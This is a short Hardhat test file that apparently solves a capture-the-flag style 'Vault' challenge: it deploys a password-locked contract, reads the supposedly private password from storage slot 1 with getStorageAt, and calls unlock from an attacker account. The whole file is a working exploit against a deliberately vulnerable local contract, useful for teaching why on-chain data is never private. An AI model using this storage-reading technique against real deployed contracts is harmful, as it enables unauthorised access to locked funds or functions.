import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { BigNumber, Contract, utils } from 'ethers';
import { ethers } from 'hardhat';

const { provider } = ethers;

const passwordInBytes = utils.formatBytes32String('password');

describe('Vault', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    const Factory = await ethers.getContractFactory('Vault');
    contract = await Factory.deploy(passwordInBytes);
    await contract.deployed();

    [owner, attacker] = await ethers.getSigners();
  });

  it('attack', async () => {
    const storedPasswordInBytes = await provider.getStorageAt(contract.address, 1);

    let tx = await contract.connect(attacker).unlock(storedPasswordInBytes);
    await tx.wait();

    expect(await contract.locked()).to.equal(false);
  });
});
